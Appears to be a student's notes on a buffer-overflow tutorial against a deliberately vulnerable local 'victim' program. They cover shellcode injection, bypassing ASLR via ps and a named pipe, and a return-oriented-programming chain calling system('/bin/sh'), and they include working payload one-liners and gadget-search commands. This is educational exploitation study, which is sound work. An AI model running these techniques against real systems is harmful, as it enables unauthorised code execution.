
##Some Assembly Required:

shell.c is a simple program to run /bin/sh

##The Shell Game:

objdump shows us where the asm code is in memory.
My addresses are slightly different than his but still take up the same amount of space.

####xxd 
xxd creates a hexdump of the input file.

##Learn bad C in only 1 hour!

####CDECL

He mentions the CDECL calling convention is the reason we can pull off this buffer overflow attack. After looking it up I think it is due to the fact that in the CDECL convention, the calling function cleans the stack. This allows us to have variable-length argument lists and because of this we can go past the buffer size and put our malicious code in.

##The Three Trials of Code Injection

####setarch
setarch changes the architecture in new program environment. He uses this command with the -R flag which allows us to disable the randomization of the virtual address space.

My arch is x86_64.

####Buffer Location

After disabling the stack protection during compiling and disabling the executable space protection using the execstack command, we run our victim file with the setarch command and see the buffer location.
```
setarch x86_64 -R ./victim
0x7fffffffdc50
What's your name?
Damien
Hello, Damien!
```

####Carrying out the Attack

After getting the buffer location in little endian, we can run the command:
```
((cat shellcode; printf %080d 0; echo $a) | xxd -r -p; cat) | setarch x86_64 -R ./victim
```
This command writes our shellcode into the buffer, fills in the rest of the name buffer with 0's and then puts 8 more 0's in to zero out the base pointer. With the last 8 bytes, we put the address of the beginning of the stack so that the program goes back into the stack and runs our shellcode, thus providing us with a shell to execute as our heart desires.

##The Importance of Being Patched

####ps
ps command on UNIX reports to us a snapshot of the current process. Using the flag -eo allows us to see all processes on the system (e flag) while also allowing us to format the output as we desire (o flag). He asks for the ESP in his command giving us the stack pointers of the processes currently running on the machine.

Once our program is running without ASLR (thanks to the setarch command) we can take a look into the process from another terminal with the command:

```
ps -o cmd,esp -C victim
```

This gives us an output of:
```
CMD                              ESP
./victim                    ffffdbe8
```
This tells us that while the victim program is waiting for user input, the stack pointer is at 0x7fffffdbe8. We can now calculate the distance from this pointer to the name buffer using the location our victim program printed out for us earlier, we find this to be 88.

With this distance we found, we can now defeat ASLR. We can do this because we simply need to find the stack pointer of the process and then add this offset we found. This allows us to put our malicious code right into the place we want it, the character buffer.

####mkfifo

mkfifo is a command that allows us to create a named pipe. This allows the pipe to last beyond the life of the process.

####Attack!

After running the program with ASLR enabled in the named pipe, we can start our attack from a different terminal using this string of commands:
```
$ sp=`ps --no-header -C victim -o esp`
$ a=`printf %016x $((0x7fff$sp+88)) | tac -r -s..`
$ ((cat shellcode; printf %080d 0; echo $a) | xxd -r -p; cat) > pip
```

The first command gets the stack pointer of the victim process. The next gets the address of the character buffer by adding 88 to the stack pointer address and converts this address to little endian. Finally we pull off the attack in the last command by injecting our code.

In this approach we must type the shell commands in the same place we run the last three commands. This is because this is the shell that is taking input in and sending it to our named pipe.


##Executable space perversion

If we re-enable the executable space protection with the command:

```
execstack -c victim
```

We can see that the above attacks don't work anymore. This is because the stack is now marked nonexecutable and thus our shellcode will not be able to run.

Return oriented programming can fix this issue. 

In return oriented programming, the buffer is not filled with code we need to execute anymore, it is instead filled with addresses of pieces of code we want to run. Each snippet of code is ended with a RET instruction. This RET instruction will increment our stack pointer by 8, thus bringing us to the address of a new piece of code. This code now runs and the cycle continues.

A sequence of code ending in RET is called a gadget.

##Go go gadgets

To pull of our attack using rop, we are going to call the system() function with "/bin/sh" as the argument.

First we find libc's compiled libraray file with the comand:

```
locate libc.so
```

Now that we found the proper file, we can search for gadgets in the file using the command:

```
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 ret
```

This command will get us all the snippets of code that end in a RET instruction in the libc.so file.

According to the notes, we want to execute the instructions:

```
pop  %rdi
retq
```

while the pointer to "/bin/sh" is at the top of the stack. As far as I understand, this will assign the pointer to %rdi which will allow us to execute the shell once the stack pointer is advanced.

We need to find these two instructions somewhere in our libc code. To do this we use the command:

```
xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}'
```

This command works by searching the libc code for the corresponding machine code to the instructions we want to execute. After running the command I get 22b9a. This means that at address 0x22b9a the two instructions we want to execute exist. 

Now all we need to do is overwrite our return address with the address of our instructions, the address of "/bin/sh" and finally the address of the system() function. This will guarantee that on the next RET instruction the address of "/bin/sh" will be put into %rdi and the system command will execute the shell.

##More happy returns

While running our victim program in one terminal without ASLR we run the commands:

```
$ pid=`ps -C victim -o pid --no-headers | tr -d ' '`
$ grep libc /proc/$pid/maps
```

The first command gets us the pid of the victim process. The grep command after that allows us to see where libc was loaded into memory for the victim process.

Thanks to our search before, we now know exactly where the instructions we want to execute lie in memory for our victim process. This address is found by adding the location of the instructions in libc to the location where libc was loaded into memory for our victim process. That address winds up being 0x7ffff7a15000 + 0x22b9a.

As to where to put "/bin/sh" we can put it in the beginning of the buffer at location 0x7fffffffdc40 (0x60 needs to be added to this because the new version of Linux organizes the stack differently).

Finally we need the location of the system() function. This can be found by running the command:

```
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
```

We see that the system() function lies at address 0x7ffff7a15000 + 0x46590.

We now have all the pieces to run our attack. We do this by using the following command:

```
(((printf %0144d 0; printf %016x $((0x7ffff7a15000+0x22b9a)) | tac -rs..; printf %016x 0x7fffffffdca0 | tac -rs..; printf %016x $((0x7ffff7a15000+0x46590)) | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | setarch x86_64 -R ./victim
```

After hitting enter a few times we see that we are successfully in a shell!


